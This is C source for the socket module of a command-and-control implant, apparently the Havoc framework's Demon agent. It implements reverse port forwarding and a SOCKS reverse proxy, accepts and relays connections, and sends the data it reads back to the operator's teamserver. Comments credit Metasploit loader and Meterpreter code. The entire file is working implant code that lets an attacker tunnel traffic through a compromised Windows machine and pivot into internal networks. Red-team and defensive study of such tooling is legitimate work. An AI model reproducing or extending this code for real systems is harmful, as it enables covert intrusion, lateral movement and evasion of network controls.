#include <Demon.h>

#include <Core/MiniStd.h>

/* attempt to receive all the requested data from the socket
 * Took it from: https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c#L41 */
BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )
{
    DWORD tret   = 0;
    DWORD nret   = 0;
    PVOID Start = Buffer;

    while ( tret < Length )
    {
        nret = Instance.Win32.recv( Socket, Start, Length - tret, 0 );

        if ( nret == SOCKET_ERROR )
        {
            PUTS( "recv Failed" )
            *BytesRead = tret;
            return FALSE;
        }

        Start += nret;
        tret  += nret;
    }

    *BytesRead = tret;

    return TRUE;
}

BOOL InitWSA( VOID )
{
    WSADATA WsData = { 0 };
    DWORD   Result = 0;

    /* Init Windows Socket. */
    if ( Instance.WSAWasInitialised == FALSE )
    {
        PUTS( "Init Windows Socket..." )

        if ( ( Result = Instance.Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
        {
            PRINTF( "WSAStartup Failed: %d\n", Result )

            /* cleanup and be gone. */
            Instance.Win32.WSACleanup();
            return FALSE;
        }

        Instance.WSAWasInitialised = TRUE;
    }

    return TRUE;
}

/* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
{
    PSOCKET_DATA    Socket    = NULL;
    SOCKADDR_IN     SockAddr  = { 0 };
    SOCKADDR_IN6_LH SockAddr6 = { 0 };
    u_long          IoBlock   = 1;
    UINT32          ErrorCode = 0;

    if ( ! IPv4 && ! IPv6 )
    {
        PUTS( "No valid IP was provided" )
        return NULL;
    }

    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] IPv4:[%lx] IPv6:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, IPv4, IPv6, LclPort, FwdAddr, FwdPort )

    /* if we specified SOCKET_TYPE_NONE then that means that
     * the caller only wants an object inserted into the socket linked list. */
    if ( ( Type != SOCKET_TYPE_NONE ) && ( Type != SOCKET_TYPE_CLIENT ) )
    {
        if ( ! InitWSA() )
            return NULL;

        PUTS( "Create Socket..." )

        if ( IPv4 )
        {
            WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL );
            if ( WinSock == INVALID_SOCKET )
            {
                PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* Set bind address and port */
            SockAddr.sin_addr.s_addr = IPv4;
            SockAddr.sin_port        = HTONS16( LclPort );
            SockAddr.sin_family      = AF_INET;

            PRINTF( "SockAddr: %d.%d.%d.%d:%d\n",
                    ( IPv4 & 0x000000ff ) >> ( 0 * 8 ),
                    ( IPv4 & 0x0000ff00 ) >> ( 1 * 8 ),
                    ( IPv4 & 0x00ff0000 ) >> ( 2 * 8 ),
                    ( IPv4 & 0xff000000 ) >> ( 3 * 8 ),
                    LclPort
            )
        }
        else
        {
            WinSock = Instance.Win32.WSASocketA( AF_INET6, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
            if ( WinSock == INVALID_SOCKET )
            {
                PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* Set bind address and port */
            MemCopy( &SockAddr6.sin6_addr, IPv6, 16 );
            SockAddr6.sin6_port   = HTONS16( LclPort );
            SockAddr6.sin6_family = AF_INET6;

            PRINTF( "SockAddr6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%d\n",
                IPv6[0],  IPv6[1],  IPv6[2],  IPv6[3],
                IPv6[4],  IPv6[5],  IPv6[6],  IPv6[7],
                IPv6[8],  IPv6[9],  IPv6[10], IPv6[11],
                IPv6[12], IPv6[13], IPv6[14], IPv6[15],
                LclPort
            )
        }

        if ( Type == SOCKET_TYPE_REVERSE_PROXY )
        {
            if ( IPv4 )
            {
                /* connect to host:port */
                if ( Instance.Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
                {
                    PRINTF( "connect failed: %d\n", NtGetLastError() )
                    goto CLEANUP;
                }
            }
            else
            {
                /* connect to host:port */
                if ( Instance.Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr6, sizeof( SOCKADDR_IN6_LH ) ) == SOCKET_ERROR )
                {
                    PRINTF( "connect failed: %d\n", NtGetLastError() )
                    goto CLEANUP;
                }
            }

            /* set socket to non blocking */
            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
            {
                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            PUTS( "Connected to host" )
        }
        else
        {
            // SOCKET_TYPE_REVERSE_PORTFWD only supports IPv4

            /* set socket to non blocking */
            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
            {
                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* bind the socket */
            if ( Instance.Win32.bind( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
            {
                PRINTF( "bind failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* now listen... */
            if ( Instance.Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
            {
                PRINTF( "listen failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            PUTS( "Started listening..." )
        }
    }

    /* Allocate our Socket object */
    Socket          = NtHeapAlloc( sizeof( SOCKET_DATA ) );
    Socket->ID      = RandomNumber32();
    Socket->Type    = Type;
    Socket->IPv4    = IPv4;
    Socket->IPv6    = IPv6;
    Socket->LclPort = LclPort;
    Socket->FwdAddr = FwdAddr;
    Socket->FwdPort = FwdPort;
    Socket->Socket  = WinSock;
    Socket->Next    = Instance.Sockets;

    Instance.Sockets = Socket;

    PRINTF( "New Socket object: %p\n", Socket )

    return Socket;

CLEANUP:
    if ( WinSock && WinSock != INVALID_SOCKET )
    {
        // close the socket preserving the last error code
        ErrorCode = NtGetLastError();
        Instance.Win32.closesocket( WinSock );
        NtSetLastError(ErrorCode);
    }

    return NULL;
}

/* Check for new connected clients. */
VOID SocketClients()
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    PSOCKET_DATA Client  = NULL;
    SOCKET       WinSock = 0;
    u_long       IoBlock = 1;

    Socket = Instance.Sockets;

    /* First lets check for new clients */
    for ( ;; )
    {
        if ( ! Socket )
            break;

        /* Accept any connection made from the rportfwd */
        if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
        {
            /* accept connection */
            WinSock = Instance.Win32.accept( Socket->Socket, NULL, NULL );
            if ( WinSock != INVALID_SOCKET )
            {
                PRINTF( "WinSock : %p\n", WinSock )
                /* set socket to non blocking */
                if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) != SOCKET_ERROR )
                {
                    /* Add the client to the socket linked list so we can read from it later on
                     * TODO: maybe ad a parent to know from what socket it came from so we can free those clients after we killed/removed the parent */
                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );

                    /* create socket response package */
                    Package = PackageCreate( DEMON_COMMAND_SOCKET );

                    /* socket package header */
                    PackageAddInt32( Package, SOCKET_COMMAND_OPEN );
                    PackageAddInt32( Package, Client->ID );

                    /* Local Host & Port data */
                    PackageAddInt32( Package, Client->IPv4 );
                    PackageAddInt32( Package, Client->LclPort );

                    /* Forward Host & Port data */
                    PackageAddInt32( Package, Client->FwdAddr );
                    PackageAddInt32( Package, Client->FwdPort );

                    /* Send the socket open request */
                    PackageTransmit( Package );
                    Package = NULL;
                }
                else
                {
                    PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )

                    /* close socket. */
                    Instance.Win32.closesocket( WinSock );
                }
            }
        }

        Socket = Socket->Next;
    }
}

/* Read data from the clients */
VOID SocketRead()
{
    PPACKAGE     Package     = NULL;
    PSOCKET_DATA Socket      = NULL;
    PVOID        NewBuffer   = NULL;
    BUFFER       PartialData = { 0 };
    BUFFER       FullData    = { 0 };
    BOOL         Failed      = FALSE;
    DWORD        ErrorCode   = 0;

    Socket = Instance.Sockets;

    /* First lets check for new clients */
    for ( ;; )
    {
        if ( ! Socket )
            break;

        Failed    = FALSE;
        ErrorCode = 0;

        /* reads data from connected clients/socks proxies */
        if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
        {
            FullData.Length = 0;
            FullData.Buffer = NULL;

            do
            {
                PartialData.Length = 0;
                PartialData.Buffer = NULL;

                /*
                 * FIONREAD returns the amount of data that can be read in a single call to the recv function
                 * this might not be the same as the total amount of data queued on the socket.
                 * because of this, we read for new data in a loop
                 */
                if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
                {
                    PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )

                    /* Tell the Socket remover that it can remove this one.
                     * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
                     * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
                            SOCKET_TYPE_CLIENT_REMOVED :
                            SOCKET_TYPE_SOCKS_REMOVED  ;

                    Failed    = TRUE;
                    ErrorCode = Instance.Win32.WSAGetLastError();
                }

                if ( PartialData.Length > 0 )
                {
                    PartialData.Buffer = NtHeapAlloc( PartialData.Length );

                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
                        Failed    = TRUE;
                        ErrorCode = Instance.Win32.WSAGetLastError();
                    }

                    if ( PartialData.Length > 0 )
                    {
                        if ( ! FullData.Buffer )
                        {
                            FullData.Buffer    = PartialData.Buffer;
                            FullData.Length    = PartialData.Length;
                            PartialData.Buffer = NULL;
                        }
                        else
                        {
                            // allocate a new buffer to store the old and new data
                            NewBuffer = NtHeapAlloc( FullData.Length + PartialData.Length );
                            // copy the old data into the new buffer
                            MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
                            // free the old 'FullData' buffer
                            MemSet( FullData.Buffer, 0, FullData.Length );
                            NtHeapFree( FullData.Buffer );
                            // set the new buffer into 'FullData'
                            FullData.Buffer = NewBuffer;
                            NewBuffer = NULL;
                            // copy the new data
                            MemCopy( C_PTR( U_PTR( FullData.Buffer ) + FullData.Length ), PartialData.Buffer, PartialData.Length );
                            FullData.Length += PartialData.Length;
                            // free the new data
                            MemSet( PartialData.Buffer, 0, PartialData.Length );
                            NtHeapFree( PartialData.Buffer );
                            PartialData.Buffer = NULL;
                        }
                    }
                }
            } while ( PartialData.Length > 0 );

            if ( FullData.Length > 0 )
            {
                PRINTF( "Read %ld bytes from socket %x\n", FullData.Length, Socket->ID )

                /* Create socket request package */
                Package = PackageCreate( DEMON_COMMAND_SOCKET );

                /* tell the teamserver to write to the socket of the forwarded host */
                PackageAddInt32( Package, SOCKET_COMMAND_READ );
                PackageAddInt32( Package, Socket->ID );
                PackageAddInt32( Package, Socket->Type );
                PackageAddInt32( Package, TRUE );

                /* add the data we read from the client socket */
                PackageAddBytes( Package, FullData.Buffer, FullData.Length );

                /* now let's send it */
                PackageTransmit( Package );
            }

            if ( Failed )
            {
                /* Create socket request package */
                Package = PackageCreate( DEMON_COMMAND_SOCKET );

                /* notify the teamserver of the error */
                PackageAddInt32( Package, SOCKET_COMMAND_READ );
                PackageAddInt32( Package, Socket->ID );
                PackageAddInt32( Package, Socket->Type );
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, ErrorCode );

                /* now let's send it */
                PackageTransmit( Package );
            }

            if ( FullData.Buffer )
            {
                /* free and clear out our buffer */
                MemSet( FullData.Buffer, 0, FullData.Length );
                NtHeapFree( FullData.Buffer );
                FullData.Length = 0;
                FullData.Buffer = NULL;
            }
        }

        Socket = Socket->Next;
    }
}

VOID SocketFree( PSOCKET_DATA Socket )
{
    PPACKAGE Package = NULL;

    PRINTF( "Closing socket %x\n", Socket->ID )

    /* do we want to remove a reverse port forward client ? */
    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
    {
        /* create socket response package */
        Package = PackageCreate( DEMON_COMMAND_SOCKET );

        /* socket package header */
        PackageAddInt32( Package, SOCKET_COMMAND_RPORTFWD_REMOVE );
        PackageAddInt32( Package, Socket->ID );

        /* Local Host & Port data */
        PackageAddInt32( Package, Socket->IPv4 );
        PackageAddInt32( Package, Socket->LclPort );

        /* Forward Host & Port data */
        PackageAddInt32( Package, Socket->FwdAddr );
        PackageAddInt32( Package, Socket->FwdPort );

        /* Send the socket open request */
        PackageTransmit( Package );
        Package = NULL;
    }

    /* do we want to remove a socks proxy client ? */
    else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
    {
        /* create socket response package */
        Package = PackageCreate( DEMON_COMMAND_SOCKET );

        /* socket package header */
        PackageAddInt32( Package, SOCKET_COMMAND_CLOSE );
        PackageAddInt32( Package, Socket->ID );
        PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );

        /* Send the socket open request */
        PackageTransmit( Package );
        Package = NULL;
    }

    if ( Socket->Socket )
    {
        Instance.Win32.closesocket( Socket->Socket );
        Socket->Socket = 0;
    }

    MemSet( Socket, 0, sizeof( SOCKET_DATA ) );
    NtHeapFree( Socket )
    Socket = NULL;
}

VOID SocketCleanDead()
{
    PSOCKET_DATA Socket = NULL;
    PSOCKET_DATA SkLast = NULL;

    /*
     * TODO: re-work on this.
     *       make that after the socket got used close it.
     *       maybe add a timeout ? after the socket didn't got used after a certain period of time.
     */
    Socket = Instance.Sockets;
    for ( ;; )
    {
        if ( ! Socket )
            break;

        if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED || Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
        {
            /* we are at the beginning. */
            if ( ! SkLast )
            {
                Instance.Sockets = Socket->Next;
                SocketFree( Socket );
                Socket = Instance.Sockets;
            }
            else
            {
                SkLast->Next = Socket->Next;
                SocketFree( Socket );
                Socket = SkLast->Next;
            }
        }
        else
        {
            SkLast = Socket;
            Socket = Socket->Next;
        }
    }
}

VOID SocketPush()
{
    /* check for new clients */
    SocketClients();

    /* Read data from the clients and send it to our server/forwarded host */
    SocketRead();

    /* kill every dead/removed socket */
    SocketCleanDead();
}

/*!
 * Query the IPv4 from the specified domain
 * @param Domain
 * @return IPv4 address
 */
DWORD DnsQueryIPv4( LPSTR Domain )
{
    ADDRINFOA   hints     = { 0 };
    PADDRINFOA  res       = NULL;
    DWORD       IP        = 0;
    INT         Ret       = 0;

    if ( ! InitWSA() )
        return 0;

    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
    if ( Ret != 0 )
    {
        PRINTF( "getaddrinfo failed with %d for %s\n", Ret, Domain );
        return 0;
    }

    IP = ((struct sockaddr_in *)res->ai_addr)->sin_addr.S_un.S_addr;

    Instance.Win32.freeaddrinfo( res );

    PRINTF( "Got IPv4 for %s: %d.%d.%d.%d\n",
        Domain,
        ( IP & 0x000000ff ) >> ( 0 * 8 ),
        ( IP & 0x0000ff00 ) >> ( 1 * 8 ),
        ( IP & 0x00ff0000 ) >> ( 2 * 8 ),
        ( IP & 0xff000000 ) >> ( 3 * 8 )
    )

    return IP;
}

/*!
 * Query the IPv6 from the specified domain
 * @param Domain
 * @return IPv6 address
 */
PBYTE DnsQueryIPv6( LPSTR Domain )
{
    ADDRINFOA   hints     = { 0 };
    PADDRINFOA  res       = NULL;
    INT         Ret       = 0;
    PBYTE       IPv6      = NULL;

    if ( ! InitWSA() )
        return 0;

    hints.ai_family   = AF_INET6;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
    if ( Ret != 0 )
    {
        PRINTF( "getaddrinfo failed with %d for %s\n", Ret, Domain );
        return NULL;
    }

    // the caller is responsible fot freeing this!
    IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );

    MemCopy( IPv6, ((struct sockaddr_in6 *)res->ai_addr)->sin6_addr.u.Byte, 16 );

    Instance.Win32.freeaddrinfo( res );

    PRINTF( "Got IPv6 for %s: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\n",
        Domain,
        IPv6[0], IPv6[1],
        IPv6[2], IPv6[3],
        IPv6[4], IPv6[5],
        IPv6[6], IPv6[7],
        IPv6[8], IPv6[9],
        IPv6[10], IPv6[11],
        IPv6[12], IPv6[13],
        IPv6[14], IPv6[15]
    )

    return IPv6;
}
